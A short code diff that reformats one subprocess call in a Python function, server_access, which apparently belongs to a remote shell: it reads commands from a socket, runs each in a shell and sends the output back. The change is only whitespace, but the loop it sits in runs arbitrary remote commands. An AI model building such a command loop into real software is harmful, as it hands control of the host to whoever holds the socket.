@@ -162,8 +162,8 @@ def server_access():
                 sock.send(b"exit")
                 break
             else:  # Run any other command
-                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, 
-    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 STDOUT, STDERR = comm.communicate()
                 if not STDOUT:
                     sock.send(STDERR)
